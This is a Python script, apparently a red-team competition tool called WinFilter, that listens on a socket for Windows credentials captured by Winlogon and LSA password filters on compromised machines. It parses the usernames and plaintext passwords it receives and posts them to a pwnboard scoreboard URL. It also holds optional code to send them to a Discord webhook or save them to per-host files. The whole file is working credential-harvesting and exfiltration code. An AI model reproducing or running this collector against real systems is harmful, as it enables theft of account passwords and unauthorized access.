import socket
import requests
import threading
import argparse
import os
import datetime

print_lock = threading.Lock()

pwnboard = "http://pwnboard.win/pwn/credential"

def handle_client(conn, addr):
    data = conn.recv(1024)
    strData = str(data)
    # print(strData) #debugging
    if "@@" in strData:  # winlogon
        type = "WinLogon"
        username = strData[2 : strData.find("@@")]
    else:
        type = "Password Change"
        username = strData[2 : strData.find(":")]
    if "cloudbase" in username:
        return
    username = username.encode('ascii', errors='ignore').decode()
    password = strData[strData.find(":") + 1 : strData.find(";end")]
    password = password.encode('ascii', errors='ignore').decode()
    timestamp = datetime.datetime.now().strftime("%G-%m-%d %H:%M:%S")
    ip = strData[
        strData.find("end;") + 4 : len(strData) - 2
    ]  # change this to ;ip and then ;end
    storage = f"\nTimestamp: {timestamp}\nSource: {ip}\nType: {type}\nUsername: {username} \nPassword: {password}\n\n"
    print(storage)

    # discordWH(ip, username, password)

    # writeFile(storage, ip)

    updatePwnboard(ip, username, password)

    if not data:
        print_lock.release()


def discordWH(addr, username, password):
    url = ""

    # Setup Post Request
    post = {}
    data = {"content": f"{addr} | {username}:{password}", "username": "WinFilter"}

    # Send and check result
    result = requests.post(url, json=data)
    try:
        result.raise_for_status()
    except requests.exceptions.HTTPError as err:
        print(err)
    else:
        print("Payload delivered successfully, code {}.".format(result.status_code))

def updatePwnboard(ip, username, password):
    data = {'ip': ip, 'service': 'system', 'username': username, 'password': password, 'message': "credentials from winfilter"}
    try:
        req = requests.post(pwnboard, json=data, timeout=3)
    except Exception as E:
        print(E)

def writeFile(storage, ip):
    with open(f"creds/{ip}", "a") as f:
        f.write(storage)


def main():
    print(
        """                                                                                                                     

  _____            ____  _____   ______         _____   ____  ____      _________________      ______        _____   
 |\    \   _____  |    ||\    \ |\     \   ____|\    \ |    ||    |    /                 \ ___|\     \   ___|\    \  
 | |    | /    /| |    | \\    \| \     \ |    | \    \|    ||    |    \______     ______/|     \     \ |    |\    \ 
 \/     / |    || |    |  \|    \  \     ||    |______/|    ||    |       \( /    /  )/   |     ,_____/||    | |    |
 /     /_  \   \/ |    |   |     \  |    ||    |----'\ |    ||    |  ____  ' |   |   '    |     \--'\_|/|    |/____/ 
|     // \  \   \ |    |   |      \ |    ||    |_____/ |    ||    | |    |   |   |        |     /___/|  |    |\    \ 
|    |/   \ |    ||    |   |    |\ \|    ||    |       |    ||    | |    |  /   //        |     \____|\ |    | |    |
|\ ___/\   \|   /||____|   |____||\_____/||____|       |____||____|/____/| /___//         |____ '     /||____| |____|
| |   | \______/ ||    |   |    |/ \|   |||    |       |    ||    |     |||`   |          |    /_____/ ||    | |    |
 \|___|/\ |    | ||____|   |____|   |___|/|____|       |____||____|_____|/|____|          |____|     | /|____| |____|
    \(   \|____|/   \(       \(       )/    )/           \(    \(    )/     \(              \( |_____|/   \(     )/  
     '      )/       '        '       '     '             '     '    '       '               '    )/       '     '   
            '                                                                                     '                  
"""
    )
    parser = argparse.ArgumentParser(
        description="Receive creds from Winlogon + LSA Filters"
    )
    parser.add_argument(
        "--ip",
        type=str,
        nargs="?",
        const=1,
        help="IP to listen on (default: 0.0.0.0)",
        default="0.0.0.0",
    )
    parser.add_argument(
        "--port",
        type=int,
        nargs="?",
        const=1,
        help="Port to listen on (default: 80)",
        default=80,
    )
    parser.add_argument("--clean", dest="clean", action="store_true")
    parser.set_defaults(clean=False)
    args = parser.parse_args()

    if args.clean:
        os.system("rm -rf creds; mkdir creds")

    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print(f"Listening on {args.ip}:{args.port}\n")
    s.bind((args.ip, args.port))
    s.listen(100)

    try:
        while True:
            conn, addr = s.accept()
            t = threading.Thread(target=handle_client, args=(conn, addr))
            t.start()

    except KeyboardInterrupt:
        exit(0)


main()
